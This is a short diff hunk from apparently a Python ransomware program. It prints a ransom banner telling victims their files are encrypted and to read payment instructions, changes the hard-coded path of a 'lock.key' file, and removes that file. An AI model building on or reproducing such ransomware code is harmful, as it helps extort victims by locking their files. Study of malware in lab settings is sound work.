@@ -40,7 +40,7 @@ print ('''
 ATTENTION!!!.. All your files has been encrypted by our Ransomware. You are victim 0101. Read the payment_instructions file for more details....ATTENTION!!!
 
 ''')
-filepath = "/home/kali/Malware/lock.key" #Replace with actual file and directory where the ransomware program resides
+filepath = "/home/parrot/Esu/Malware/lock.key" #Replace with actual file and directory where the ransomware program resides
 
 try:
 	os.remove(filepath)
